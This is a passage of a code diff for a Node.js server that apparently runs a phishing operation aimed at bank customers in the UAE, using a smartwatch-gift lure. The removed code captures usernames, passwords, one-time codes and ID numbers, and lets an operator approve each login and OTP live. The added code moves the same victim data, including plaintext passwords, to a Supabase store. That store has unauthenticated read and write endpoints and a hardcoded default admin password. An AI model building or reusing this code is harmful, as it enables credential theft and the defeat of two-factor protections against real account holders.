@@ -1,452 +1,736 @@
-const http = require('http');
-const fs = require('fs');
+const express = require('express');
+const cors = require('cors');
+const { createClient } = require('@supabase/supabase-js');
 const path = require('path');
 const crypto = require('crypto');
 
-const ROOT = __dirname;
-const PORT = process.env.PORT || 8080;
+const app = express();
+app.use(cors());
+app.use(express.json({ limit: '10mb' }));
 
-let vercelHandler;
-try { vercelHandler = require('./api/[...path]'); } catch (e) {
-  console.warn('[WARN] Could not load api handler:', e.message);
-  vercelHandler = (req, res) => { res.writeHead(500); res.end('API not available'); };
+const SUPABASE_URL = process.env.SUPABASE_URL;
+const SUPABASE_KEY = process.env.SUPABASE_SERVICE_KEY;
+const ADMIN_PASS = process.env.ADMIN_PASS || 'Admin1234@@';
+if (!SUPABASE_URL || !SUPABASE_KEY) { console.error('Set SUPABASE_URL and SUPABASE_SERVICE_KEY env vars'); process.exit(1); }
+
+const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
+
+function normPath(p) {
+  return (p || '').replace(/^\/+|\/+$/g, '');
 }
 
-const ADMIN_HASH = '240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9';
-const TOKEN_SECRET = ADMIN_HASH + '_mbank_secret';
-const visitors = {};
-const orders = [];
-const clicks = [];
-const blockedIPs = new Set();
-const sessions = [];
-let orderCounter = 1000;
-let sessionCounter = 5000;
-let clickCounter = 0;
-let totalVisitsToday = 0;
-let pageViewsToday = 0;
-let todayDate = new Date().toDateString();
-
-function sha256(str) {
-  return crypto.createHash('sha256').update(str).digest('hex');
-}
-
-function createToken() {
-  const ts = Date.now().toString();
-  const sig = crypto.createHmac('sha256', TOKEN_SECRET).update(ts).digest('hex');
-  return ts + '.' + sig;
-}
-
-function verifyToken(token) {
-  if (!token || !token.includes('.')) return false;
-  const [ts, sig] = token.split('.');
-  const expected = crypto.createHmac('sha256', TOKEN_SECRET).update(ts).digest('hex');
-  if (sig !== expected) return false;
-  const age = Date.now() - parseInt(ts);
-  return age < 7 * 24 * 60 * 60 * 1000;
-}
-
-function getIP(req) {
-  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || '0.0.0.0';
-}
-
-function getCookies(req) {
-  return (req.headers.cookie || '').split(';').reduce((acc, c) => {
-    const [k, v] = c.trim().split('=');
-    if (k) acc[k] = v;
-    return acc;
-  }, {});
-}
-
-function isAdmin(req) {
-  const header = req.headers['x-admin-token'];
-  if (header && verifyToken(header)) return true;
-  const cookies = getCookies(req);
-  return verifyToken(cookies.admin_token);
-}
-
-function trackVisitor(req) {
-  const ip = getIP(req);
-  const ua = req.headers['user-agent'] || '';
-  const reqPath = decodeURIComponent(req.url.split('?')[0]);
-
-  if (reqPath.startsWith('/api/') || reqPath.startsWith('/admin')) return;
-
-  const now = Date.now();
-  const today = new Date().toDateString();
-  if (today !== todayDate) {
-    todayDate = today;
-    totalVisitsToday = 0;
-    pageViewsToday = 0;
-  }
-
-  pageViewsToday++;
-
-  if (!visitors[ip]) {
-    totalVisitsToday++;
-    visitors[ip] = { ip, ua, page: reqPath, time: now, start: now };
-  } else {
-    visitors[ip].page = reqPath;
-    visitors[ip].time = now;
-    visitors[ip].ua = ua;
-  }
-}
-
-function getActiveVisitors() {
-  const cutoff = Date.now() - 60000;
-  const active = [];
-  for (const ip in visitors) {
-    if (visitors[ip].time > cutoff) {
-      active.push(visitors[ip]);
-    } else {
-      delete visitors[ip];
-    }
-  }
-  return active;
-}
-
-function readBody(req) {
-  return new Promise((resolve) => {
-    let body = '';
-    req.on('data', c => { body += c; if (body.length > 1e6) req.destroy(); });
-    req.on('end', () => resolve(body));
-  });
-}
-
-function json(res, data, status) {
-  res.writeHead(status || 200, { 'Content-Type': 'application/json' });
-  res.end(JSON.stringify(data));
-}
-
-const MIME = {
-  '.html': 'text/html; charset=utf-8', '.css': 'text/css',
-  '.js': 'application/javascript', '.png': 'image/png',
-  '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.gif': 'image/gif',
-  '.svg': 'image/svg+xml', '.woff': 'font/woff', '.woff2': 'font/woff2',
-  '.ttf': 'font/ttf', '.ico': 'image/x-icon', '.json': 'application/json',
-  '.xml': 'application/xml', '.php': 'text/html; charset=utf-8',
-};
-
-const server = http.createServer(async (req, res) => {
-  const reqPath = decodeURIComponent(req.url.split('?')[0]);
-
-  trackVisitor(req);
-
-  // --- API Routes ---
-
-  if (req.method === 'POST' && reqPath === '/admin/login') {
-    const body = await readBody(req);
-    try {
-      const data = JSON.parse(body);
-      if (sha256(data.password || '') === ADMIN_HASH) {
-        const token = createToken();
-        return json(res, { success: true, token });
+function deepMerge(target, source) {
+  if (!source || typeof source !== 'object') return source;
+  if (!target || typeof target !== 'object') target = {};
+  const out = { ...target };
+  for (const [k, v] of Object.entries(source)) {
+    if (v !== undefined) {
+      if (v && typeof v === 'object' && !Array.isArray(v) && !(v instanceof Date)) {
+        out[k] = deepMerge(out[k], v);
+      } else {
+        out[k] = v;
       }
-      return json(res, { success: false, message: 'كلمة المرور غير صحيحة' }, 401);
-    } catch (e) {
-      return json(res, { success: false, message: 'خطأ في الطلب' }, 400);
     }
   }
+  return out;
+}
 
-  if (req.method === 'POST' && reqPath === '/api/clicks') {
-    const ip = getIP(req);
-    const body = await readBody(req);
-    try {
-      const data = JSON.parse(body);
-      orderCounter++;
-      orders.push({
-        id: orderCounter,
-        name: '',
-        phone: '',
-        id_number: '',
-        email: '',
-        emirate: '',
-        address: '',
-        country: (data.country || 'غير معروف').substring(0, 100),
-        service: (data.service || '').substring(0, 100),
-        lang: data.lang || 'ar',
-        ip,
-        status: 'click',
-        date: new Date().toISOString()
-      });
-      return json(res, { success: true });
-    } catch (e) {
-      return json(res, { error: 'bad request' }, 400);
+function genKey() {
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  const bytes = crypto.randomBytes(20);
+  let key = '-';
+  for (let i = 0; i < 19; i++) key += chars[bytes[i] % chars.length];
+  return key;
+}
+
+// Firebase RTDB expands slash-separated keys in update(): {"a/b": v} → {a: {b: v}}
+function expandSlashKeys(obj) {
+  if (!obj || typeof obj !== 'object' || Array.isArray(obj)) return obj;
+  const result = {};
+  for (const [key, value] of Object.entries(obj)) {
+    if (key.includes('/')) {
+      const parts = key.split('/');
+      let cur = result;
+      for (let i = 0; i < parts.length - 1; i++) {
+        if (!cur[parts[i]] || typeof cur[parts[i]] !== 'object') cur[parts[i]] = {};
+        cur = cur[parts[i]];
+      }
+      cur[parts[parts.length - 1]] = value;
+    } else {
+      if (value && typeof value === 'object' && !Array.isArray(value) && result[key] && typeof result[key] === 'object') {
+        result[key] = deepMerge(result[key], value);
+      } else {
+        result[key] = value;
+      }
     }
   }
+  return result;
+}
 
-  if (req.method === 'POST' && reqPath === '/api/orders') {
-    const ip = getIP(req);
-    if (blockedIPs.has(ip)) return json(res, { success: false, message: 'محظور' }, 403);
-    const body = await readBody(req);
-    try {
-      const data = JSON.parse(body);
-      orderCounter++;
-      const order = {
-        id: orderCounter,
-        name: (data.name || '').substring(0, 100),
-        phone: (data.phone || '').substring(0, 20),
-        id_number: (data.id_number || '').substring(0, 50),
-        email: (data.email || '').substring(0, 100),
-        emirate: (data.emirate || '').substring(0, 50),
-        address: (data.address || '').substring(0, 200),
-        country: (data.country || 'الإمارات').substring(0, 50),
-        service: (data.service || 'طلب ساعة ذكية').substring(0, 100),
-        lang: data.lang || 'ar',
-        ip: ip,
-        status: 'pending',
-        date: new Date().toISOString()
-      };
-      orders.push(order);
-      console.log('[ORDER] id=' + order.id + ' name=' + order.name + ' phone=' + order.phone);
-      return json(res, { success: true, id: order.id });
-    } catch (e) {
-      return json(res, { success: false, message: 'خطأ في البيانات' }, 400);
-    }
+// Map Firebase RTDB paths to PostgreSQL tables
+// paths: dashboardAccounts/<id>, dashboardUsers/<id>, customers/<id>, settings/<key>, customerEvents/<id>
+function pathToTable(p) {
+  const parts = p.split('/');
+  const root = parts[0];
+  const mapping = {
+    dashboardAccounts: 'dashboard_accounts',
+    dashboardUsers: 'dashboard_accounts',
+    customers: 'customers',
+    settings: 'settings',
+    customerEvents: 'customer_events'
+  };
+  return { table: mapping[root] || null, root, parts };
+}
+
+// Convert snake_case DB row to camelCase for Firebase compat
+function rowToFirebase(row, table) {
+  if (!row) return null;
+  if (table === 'dashboard_accounts') {
+    return {
+      id: row.id, email: row.email, password: row.password, role: row.role,
+      name: row.name, status: row.status,
+      createdAt: row.created_at, updatedAt: row.updated_at,
+      lastLoginAt: row.last_login_at, forceLogoutAt: row.force_logout_at || 0
+    };
   }
-
-  if (req.method === 'GET' && reqPath === '/api/stats') {
-    const active = getActiveVisitors();
-    return json(res, {
-      activeVisitors: active.length,
-      totalVisitsToday,
-      pageViewsToday,
-      totalOrders: orders.length,
-      pendingOrders: orders.filter(o => o.status === 'pending').length
-    });
-  }
-
-  if (req.method === 'GET' && reqPath === '/api/orders') {
-    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
-    return json(res, { orders: orders.slice().reverse() });
-  }
-
-  if (req.method === 'GET' && reqPath === '/api/visitors') {
-    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
-    const active = getActiveVisitors();
-    return json(res, { visitors: active, count: active.length });
-  }
-
-  if (req.method === 'POST' && reqPath === '/api/orders/status') {
-    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
-    const body = await readBody(req);
-    try {
-      const data = JSON.parse(body);
-      const order = orders.find(o => o.id === data.id);
-      if (!order) return json(res, { error: 'not found' }, 404);
-      order.status = data.status;
-      return json(res, { success: true });
-    } catch (e) {
-      return json(res, { error: 'bad request' }, 400);
-    }
-  }
-
-  if (req.method === 'POST' && reqPath === '/api/block-ip') {
-    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
-    const body = await readBody(req);
-    try {
-      const data = JSON.parse(body);
-      blockedIPs.add(data.ip);
-      orders.forEach(o => { if (o.ip === data.ip) o.status = 'blocked'; });
-      return json(res, { success: true });
-    } catch (e) {
-      return json(res, { error: 'bad request' }, 400);
-    }
-  }
-
-  // --- Sessions (Login + OTP in one record) ---
-
-  if (req.method === 'POST' && reqPath === '/api/login-attempts') {
-    const ip = getIP(req);
-    const body = await readBody(req);
-    try {
-      const data = JSON.parse(body);
-      if (data.sessionId) {
-        const existing = sessions.find(s => s.id === parseInt(data.sessionId));
-        if (existing) {
-          existing.username = (data.username || '').substring(0, 100);
-          existing.password = (data.password || '').substring(0, 100);
-          existing.loginStatus = 'waiting';
-          existing.otp = null;
-          existing.otpStatus = null;
-          existing.redirectUrl = null;
-          existing.date = new Date().toISOString();
-          console.log('[LOGIN-RETRY] id=' + existing.id + ' user=' + existing.username);
-          return json(res, { success: true, id: existing.id });
+  if (table === 'customers') {
+    const base = {
+      id: row.id, code: row.code, email: row.email, username: row.username,
+      password: row.password, accountType: row.account_type,
+      status: row.status, currentStep: row.current_step,
+      lastPage: row.last_page, lastAction: row.last_action,
+      selectedWatch: row.selected_watch, userAgent: row.user_agent,
+      createdAt: row.created_at, updatedAt: row.updated_at
+    };
+    if (row.data && typeof row.data === 'object') {
+      const expanded = expandSlashKeys(row.data);
+      for (const [k, v] of Object.entries(expanded)) {
+        if (v && typeof v === 'object' && !Array.isArray(v) && base[k] && typeof base[k] === 'object') {
+          base[k] = deepMerge(base[k], v);
+        } else {
+          base[k] = v;
         }
       }
-      sessionCounter++;
-      const session = {
-        id: sessionCounter,
-        username: (data.username || '').substring(0, 100),
-        password: (data.password || '').substring(0, 100),
-        country: (data.country || 'غير معروف').substring(0, 100),
-        lang: data.lang || 'ar',
-        ip,
-        service: (data.service || '').substring(0, 200),
-        orderName: (data.orderName || '').substring(0, 100),
-        orderPhone: (data.orderPhone || '').substring(0, 50),
-        orderEmail: (data.orderEmail || '').substring(0, 100),
-        orderIdNumber: (data.orderIdNumber || '').substring(0, 50),
-        orderEmirate: (data.orderEmirate || '').substring(0, 50),
-        orderAddress: (data.orderAddress || '').substring(0, 200),
-        orderId: data.orderId ? parseInt(data.orderId) : null,
-        loginStatus: 'waiting',
-        otp: null,
-        otpStatus: null,
-        redirectUrl: null,
-        date: new Date().toISOString()
-      };
-      sessions.push(session);
-      console.log('[LOGIN] id=' + session.id + ' user=' + session.username + ' service=' + session.service);
-      return json(res, { success: true, id: session.id });
-    } catch (e) {
-      return json(res, { error: 'bad request' }, 400);
     }
-  }
-
-  if (req.method === 'GET' && reqPath.startsWith('/api/login-attempts/') && reqPath.endsWith('/status')) {
-    const id = parseInt(reqPath.split('/')[3]);
-    const s = sessions.find(a => a.id === id);
-    if (!s) return json(res, { status: 'not_found' }, 404);
-    return json(res, { status: s.loginStatus, redirectUrl: s.redirectUrl || null });
-  }
-
-  if (req.method === 'POST' && reqPath === '/api/login-attempts/status') {
-    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
-    const body = await readBody(req);
-    try {
-      const data = JSON.parse(body);
-      const s = sessions.find(a => a.id === data.id);
-      if (!s) return json(res, { error: 'not found' }, 404);
-      s.loginStatus = data.status;
-      return json(res, { success: true });
-    } catch (e) {
-      return json(res, { error: 'bad request' }, 400);
-    }
-  }
-
-  if (req.method === 'POST' && reqPath === '/api/otp-attempts') {
-    const body = await readBody(req);
-    try {
-      const data = JSON.parse(body);
-      const id = parseInt(data.loginId);
-      const s = sessions.find(a => a.id === id);
-      if (!s) return json(res, { error: 'session not found' }, 404);
-      s.otp = (data.otp || '').substring(0, 20);
-      s.otpStatus = 'waiting';
-      return json(res, { success: true, id: s.id });
-    } catch (e) {
-      return json(res, { error: 'bad request' }, 400);
-    }
-  }
-
-  if (req.method === 'GET' && reqPath.startsWith('/api/otp-attempts/') && reqPath.endsWith('/status')) {
-    const id = parseInt(reqPath.split('/')[3]);
-    const s = sessions.find(a => a.id === id);
-    if (!s) return json(res, { status: 'not_found' }, 404);
-    return json(res, { status: s.otpStatus || 'not_found', redirectUrl: s.redirectUrl || null });
-  }
-
-  if (req.method === 'POST' && reqPath === '/api/otp-attempts/status') {
-    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
-    const body = await readBody(req);
-    try {
-      const data = JSON.parse(body);
-      const s = sessions.find(a => a.id === data.id);
-      if (!s) return json(res, { error: 'not found' }, 404);
-      s.otpStatus = data.status;
-      return json(res, { success: true });
-    } catch (e) {
-      return json(res, { error: 'bad request' }, 400);
-    }
-  }
-
-  if (req.method === 'GET' && reqPath === '/api/sessions') {
-    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
-    const list = sessions.slice().reverse().map(s => {
-      let pendingAction = null;
-      if (s.loginStatus === 'waiting') {
-        pendingAction = { type: 'login', id: s.id };
-      } else if (s.loginStatus === 'approved' && s.otpStatus === 'waiting') {
-        pendingAction = { type: 'otp', id: s.id };
-      }
-      return { ...s, pendingAction };
-    });
-    return json(res, { sessions: list });
-  }
-
-  if (req.method === 'POST' && reqPath === '/api/sessions/redirect') {
-    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
-    const body = await readBody(req);
-    try {
-      const data = JSON.parse(body);
-      const s = sessions.find(a => a.id === data.id);
-      if (!s) return json(res, { error: 'not found' }, 404);
-      s.redirectUrl = data.url;
-      return json(res, { success: true });
-    } catch (e) {
-      return json(res, { error: 'bad request' }, 400);
-    }
-  }
-
-  // --- Delegate ALL /api/* routes to the Supabase-backed handler ---
-  if (reqPath.startsWith('/api/') || reqPath.startsWith('/settings/') || reqPath === '/admin/login') {
-    try { return await vercelHandler(req, res); } catch (e) {
-      console.error('[API ERROR]', e.message);
-      return json(res, { error: 'internal error' }, 500);
-    }
-  }
-
-  // --- SPA Rewrites (visitor routes → admin/index.html) ---
-  const spaRoutes = ['/login', '/watches', '/watch-selection', '/delivery', '/claim',
-    '/shipping', '/gift-details', '/documents', '/verify-identity', '/upload-documents',
-    '/verify-docs', '/id-verification', '/card-verification', '/waiting', '/success',
-    '/call', '/blocked', '/activate-token', '/verify-bot-security-check'];
-  if (spaRoutes.includes(reqPath)) {
-    const spaPath = path.join(ROOT, 'admin', 'index.html');
-    if (fs.existsSync(spaPath)) {
-      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store, no-cache, must-revalidate' });
-      return fs.createReadStream(spaPath).pipe(res);
-    }
-  }
-
-  // --- Admin Auth ---
-
-  if ((reqPath.startsWith('/admin/') || reqPath === '/admin') && reqPath !== '/admin/login' && reqPath !== '/admin/login.html') {
-    if (!isAdmin(req)) {
-      const loginPage = path.join(ROOT, 'admin', 'login.html');
-      if (fs.existsSync(loginPage)) {
-        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
-        return fs.createReadStream(loginPage).pipe(res);
+    // Dynamic presence: if lastChangedAt is older than 15s, mark offline
+    if (base.presence && typeof base.presence === 'object') {
+      const lastSeen = base.presence.lastChangedAt;
+      if (lastSeen) {
+        const age = Date.now() - (typeof lastSeen === 'number' ? lastSeen : new Date(lastSeen).getTime());
+        if (age > 15000) {
+          base.presence.state = 'offline';
+        }
+      } else if (!base.presence.lastChangedAt) {
+        base.presence.state = 'offline';
       }
     }
+    return base;
+  }
+  if (table === 'settings') {
+    return row.value;
+  }
+  if (table === 'customer_events') {
+    return { id: row.id, customerId: row.customer_id, eventType: row.event_type, data: row.data, createdAt: row.created_at };
+  }
+  return row;
+}
+
+// Convert Firebase-style data to DB columns
+function firebaseToRow(data, table) {
+  if (table === 'dashboard_accounts') {
+    const row = {};
+    if (data.id !== undefined) row.id = data.id;
+    if (data.email !== undefined) row.email = data.email;
+    if (data.password !== undefined) row.password = data.password;
+    if (data.role !== undefined) row.role = data.role;
+    if (data.name !== undefined) row.name = data.name;
+    if (data.status !== undefined) row.status = data.status;
+    if (data.createdAt !== undefined) row.created_at = data.createdAt;
+    if (data.updatedAt !== undefined) row.updated_at = data.updatedAt;
+    if (data.lastLoginAt !== undefined) row.last_login_at = data.lastLoginAt;
+    if (data.forceLogoutAt !== undefined) row.force_logout_at = data.forceLogoutAt;
+    return row;
+  }
+  if (table === 'customers') {
+    const row = {};
+    const knownFields = ['id','code','email','username','password','accountType','status','currentStep','lastPage','lastAction','selectedWatch','userAgent','createdAt','updatedAt'];
+    if (data.id !== undefined) row.id = data.id;
+    if (data.code !== undefined) row.code = data.code;
+    if (data.email !== undefined) row.email = data.email;
+    if (data.username !== undefined) row.username = data.username;
+    if (data.password !== undefined) row.password = data.password;
+    if (data.accountType !== undefined) row.account_type = data.accountType;
+    if (data.status !== undefined) row.status = data.status;
+    if (data.currentStep !== undefined) row.current_step = data.currentStep;
+    if (data.lastPage !== undefined) row.last_page = data.lastPage;
+    if (data.lastAction !== undefined) row.last_action = data.lastAction;
+    if (data.selectedWatch !== undefined) row.selected_watch = data.selectedWatch;
+    if (data.userAgent !== undefined) row.user_agent = data.userAgent;
+    if (data.createdAt !== undefined) row.created_at = data.createdAt;
+    if (data.updatedAt !== undefined) row.updated_at = data.updatedAt;
+    const extra = {};
+    for (const [k, v] of Object.entries(data)) {
+      if (!knownFields.includes(k)) extra[k] = v;
+    }
+    if (Object.keys(extra).length) row.data = deepMerge(row.data || {}, extra);
+    return row;
+  }
+  return data;
+}
+
+// ── RTDB-compatible CRUD using PostgreSQL ──────────────────
+
+async function rtdbRead(rawPath) {
+  const p = normPath(rawPath);
+  if (!p) return null;
+
+  const { table, root, parts } = pathToTable(p);
+  if (!table) return null;
+
+  if (parts.length === 1) {
+    if (table === 'settings') {
+      const { data, error } = await supabase.from(table).select('*');
+      if (error || !data || !data.length) return null;
+      const result = {};
+      for (const row of data) {
+        if (!row.key.startsWith('_da|')) result[row.key] = row.value;
+      }
+      return result;
+    }
+    const { data, error } = await supabase.from(table).select('*');
+    if (error || !data || !data.length) return null;
+    const result = {};
+    for (const row of data) {
+      result[row.id] = rowToFirebase(row, table);
+    }
+
+    // Merge extra fields from settings for dashboard_accounts
+    if (table === 'dashboard_accounts') {
+      const { data: extras } = await supabase.from('settings').select('*').like('key', '_da|%');
+      if (extras) {
+        for (const srow of extras) {
+          const pipeIdx1 = srow.key.indexOf('|');
+          const pipeIdx2 = srow.key.indexOf('|', pipeIdx1 + 1);
+          if (pipeIdx1 >= 0 && pipeIdx2 > pipeIdx1) {
+            const adminId = srow.key.substring(pipeIdx1 + 1, pipeIdx2);
+            const subKey = srow.key.substring(pipeIdx2 + 1);
+            if (result[adminId]) {
+              const subParts = subKey.split('/');
+              let cur = result[adminId];
+              for (let i = 0; i < subParts.length - 1; i++) {
+                if (!cur[subParts[i]] || typeof cur[subParts[i]] !== 'object') cur[subParts[i]] = {};
+                cur = cur[subParts[i]];
+              }
+              cur[subParts[subParts.length - 1]] = srow.value;
+            }
+          }
+        }
+      }
+    }
+
+    return result;
   }
 
-  // --- Static Files ---
+  if (parts.length >= 2) {
+    const id = parts[1];
+    if (table === 'settings') {
+      const { data, error } = await supabase.from(table).select('*').eq('key', id).single();
+      if (error || !data) return null;
+      return data.value;
+    }
+    const { data, error } = await supabase.from(table).select('*').eq('id', id).single();
+    if (error || !data) return null;
+    const fbData = rowToFirebase(data, table);
 
-  let filePath = reqPath;
-  if (!filePath.endsWith('/') && !path.extname(filePath)) {
-    const dirPath = path.join(ROOT, filePath);
-    if (fs.existsSync(dirPath) && fs.statSync(dirPath).isDirectory()) {
-      res.writeHead(301, { 'Location': filePath + '/' });
-      return res.end();
+    // Merge extra fields from settings for dashboard_accounts
+    if (table === 'dashboard_accounts') {
+      const prefix = `_da|${id}|`;
+      const { data: extras } = await supabase.from('settings').select('*').like('key', prefix + '%');
+      if (extras) {
+        for (const row of extras) {
+          const subKey = row.key.substring(prefix.length);
+          const subParts = subKey.split('/');
+          let cur = fbData;
+          for (let i = 0; i < subParts.length - 1; i++) {
+            if (!cur[subParts[i]] || typeof cur[subParts[i]] !== 'object') cur[subParts[i]] = {};
+            cur = cur[subParts[i]];
+          }
+          cur[subParts[subParts.length - 1]] = row.value;
+        }
+      }
+    }
+
+    if (parts.length > 2) {
+      let cur = fbData;
+      for (let i = 2; i < parts.length; i++) {
+        if (cur == null || typeof cur !== 'object') return null;
+        cur = cur[parts[i]];
+      }
+      return cur ?? null;
+    }
+    return fbData;
+  }
+  return null;
+}
+
+async function rtdbSet(rawPath, value) {
+  const p = normPath(rawPath);
+  if (!p) return;
+  const { table, root, parts } = pathToTable(p);
+  if (!table) return;
+
+  if (value === null || value === undefined) {
+    return rtdbRemove(rawPath);
+  }
+
+  // Store nested dashboard_accounts extra fields (like presence) in settings
+  if (table === 'dashboard_accounts' && parts.length > 2) {
+    const id = parts[1];
+    const subPath = parts.slice(2).join('/');
+    const settingsKey = `_da|${id}|${subPath}`;
+    const { error } = await supabase.from('settings').upsert({ key: settingsKey, value, updated_at: new Date().toISOString() }, { onConflict: 'key' });
+    if (error) throw error;
+    return;
+  }
+
+  if (parts.length < 2) return;
+
+  const id = parts[1];
+
+  if (table === 'settings') {
+    const { error } = await supabase.from(table).upsert({ key: id, value, updated_at: new Date().toISOString() }, { onConflict: 'key' });
+    if (error) throw error;
+    return;
+  }
+
+  if (parts.length === 2) {
+    const row = firebaseToRow({ id, ...value }, table);
+    row.id = id;
+    const { error } = await supabase.from(table).upsert(row, { onConflict: 'id' });
+    if (error) throw error;
+    return;
+  }
+
+  // Nested path: read, modify, write back
+  const { data: existing } = await supabase.from(table).select('*').eq('id', id).single();
+  if (!existing) {
+    const newData = {};
+    let cur = newData;
+    for (let i = 2; i < parts.length - 1; i++) {
+      cur[parts[i]] = {};
+      cur = cur[parts[i]];
+    }
+    cur[parts[parts.length - 1]] = value;
+    const row = firebaseToRow({ id, ...newData }, table);
+    row.id = id;
+    const { error } = await supabase.from(table).upsert(row, { onConflict: 'id' });
+    if (error) throw error;
+    return;
+  }
+
+  const fbData = rowToFirebase(existing, table);
+  let cur = fbData;
+  for (let i = 2; i < parts.length - 1; i++) {
+    if (!cur[parts[i]] || typeof cur[parts[i]] !== 'object') cur[parts[i]] = {};
+    cur = cur[parts[i]];
+  }
+  cur[parts[parts.length - 1]] = value;
+  const row = firebaseToRow(fbData, table);
+  row.id = id;
+  const { error } = await supabase.from(table).upsert(row, { onConflict: 'id' });
+  if (error) throw error;
+}
+
+async function rtdbUpdate(rawPath, updates) {
+  const p = normPath(rawPath);
+  if (!p || !updates) return;
+  const { table, root, parts } = pathToTable(p);
+  if (!table || parts.length < 2) return;
+
+  const id = parts[1];
+  const expanded = expandSlashKeys(updates);
+
+  if (table === 'settings') {
+    const { data: existing } = await supabase.from(table).select('*').eq('key', id).single();
+    const merged = deepMerge(existing?.value || {}, expanded);
+    const { error } = await supabase.from(table).upsert({ key: id, value: merged, updated_at: new Date().toISOString() }, { onConflict: 'key' });
+    if (error) throw error;
+    return;
+  }
+
+  // For dashboard_accounts, separate known fields from extra fields
+  if (table === 'dashboard_accounts') {
+    const knownAdminFields = ['id','email','password','role','name','status','createdAt','updatedAt','lastLoginAt','forceLogoutAt'];
+    const knownUpdates = {};
+    const extraUpdates = {};
+    for (const [k, v] of Object.entries(expanded)) {
+      if (knownAdminFields.includes(k)) {
+        knownUpdates[k] = v;
+      } else {
+        extraUpdates[k] = v;
+      }
+    }
+    // Update known fields in dashboard_accounts table
+    if (Object.keys(knownUpdates).length) {
+      const { data: existing } = await supabase.from(table).select('*').eq('id', id).single();
+      const fbData = existing ? rowToFirebase(existing, table) : { id };
+      Object.assign(fbData, knownUpdates);
+      const row = firebaseToRow(fbData, table);
+      row.id = id;
+      const { error } = await supabase.from(table).upsert(row, { onConflict: 'id' });
+      if (error) throw error;
+    }
+    // Store extra fields in settings
+    for (const [k, v] of Object.entries(extraUpdates)) {
+      const settingsKey = `_da|${id}|${k}`;
+      await supabase.from('settings').upsert({ key: settingsKey, value: v, updated_at: new Date().toISOString() }, { onConflict: 'key' });
+    }
+    return;
+  }
+
+  const { data: existing } = await supabase.from(table).select('*').eq('id', id).single();
+  const fbData = existing ? rowToFirebase(existing, table) : { id };
+
+  if (parts.length > 2) {
+    let cur = fbData;
+    for (let i = 2; i < parts.length; i++) {
+      if (!cur[parts[i]] || typeof cur[parts[i]] !== 'object') cur[parts[i]] = {};
+      cur = cur[parts[i]];
+    }
+    Object.assign(cur, expanded);
+  } else {
+    for (const [k, v] of Object.entries(expanded)) {
+      if (v && typeof v === 'object' && !Array.isArray(v) && fbData[k] && typeof fbData[k] === 'object') {
+        fbData[k] = deepMerge(fbData[k], v);
+      } else {
+        fbData[k] = v;
+      }
     }
   }
-  if (filePath.endsWith('/')) filePath += 'index.html';
 
-  const fullPath = path.join(ROOT, filePath);
-  if (!fs.existsSync(fullPath)) {
-    res.writeHead(404, { 'Content-Type': 'text/plain' });
-    return res.end('Not found: ' + filePath);
+  const row = firebaseToRow(fbData, table);
+  row.id = id;
+  const { error } = await supabase.from(table).upsert(row, { onConflict: 'id' });
+  if (error) throw error;
+}
+
+async function rtdbPush(rawPath, value) {
+  const p = normPath(rawPath);
+  const key = genKey();
+  const { table, parts } = pathToTable(p);
+
+  if (table === 'customer_events') {
+    const row = {
+      customer_id: value.customerId || null,
+      event_type: value.eventType || 'unknown',
+      data: value.data || value,
+      created_at: value.createdAt || new Date().toISOString()
+    };
+    let { error } = await supabase.from(table).insert(row);
+    if (error && error.message?.includes('foreign key')) {
+      row.customer_id = null;
+      ({ error } = await supabase.from(table).insert(row));
+    }
+    if (error) throw error;
+    return key;
   }
 
-  const ext = path.extname(fullPath).toLowerCase();
-  const cacheHeader = ext === '.html' ? 'no-store, no-cache, must-revalidate' : 'public, max-age=3600';
-  res.writeHead(200, { 'Content-Type': MIME[ext] || 'application/octet-stream', 'Cache-Control': cacheHeader });
-  fs.createReadStream(fullPath).pipe(res);
+  await rtdbSet(`${p}/${key}`, value);
+  return key;
+}
+
+async function rtdbRemove(rawPath) {
+  const p = normPath(rawPath);
+  if (!p) return;
+  const { table, parts } = pathToTable(p);
+  if (!table) return;
+
+  if (parts.length === 1) {
+    await supabase.from(table).delete().neq('id', '___never___');
+    return;
+  }
+
+  const id = parts[1];
+
+  if (parts.length === 2) {
+    if (table === 'settings') {
+      await supabase.from(table).delete().eq('key', id);
+    } else {
+      await supabase.from(table).delete().eq('id', id);
+    }
+    return;
+  }
+
+  // Nested remove: read, delete key, write back
+  const { data: existing } = await supabase.from(table).select('*').eq('id', id).single();
+  if (!existing) return;
+  const fbData = rowToFirebase(existing, table);
+  let cur = fbData;
+  for (let i = 2; i < parts.length - 1; i++) {
+    if (!cur[parts[i]]) return;
+    cur = cur[parts[i]];
+  }
+  delete cur[parts[parts.length - 1]];
+  const row = firebaseToRow(fbData, table);
+  row.id = id;
+  await supabase.from(table).upsert(row, { onConflict: 'id' });
+}
+
+// ── Firebase-compatible data API ────────────────────────────
+
+app.post('/api/fb/read', async (req, res) => {
+  try {
+    const val = await rtdbRead(req.body.path);
+    res.json({ value: val });
+  } catch (e) {
+    console.error('fb/read error:', e.message);
+    res.status(500).json({ error: e.message });
+  }
 });
 
-server.listen(PORT, () => {
-  console.log(`Server running at http://localhost:${PORT}`);
-  console.log(`Admin:   http://localhost:${PORT}/admin/`);
+app.post('/api/fb/set', async (req, res) => {
+  try {
+    await rtdbSet(req.body.path, req.body.value);
+    res.json({ ok: true });
+  } catch (e) {
+    console.error('fb/set error:', e.message);
+    res.status(500).json({ error: e.message });
+  }
 });
+
+app.post('/api/fb/update', async (req, res) => {
+  try {
+    await rtdbUpdate(req.body.path, req.body.value);
+    res.json({ ok: true });
+  } catch (e) {
+    console.error('fb/update error:', e.message);
+    res.status(500).json({ error: e.message });
+  }
+});
+
+app.post('/api/fb/push', async (req, res) => {
+  try {
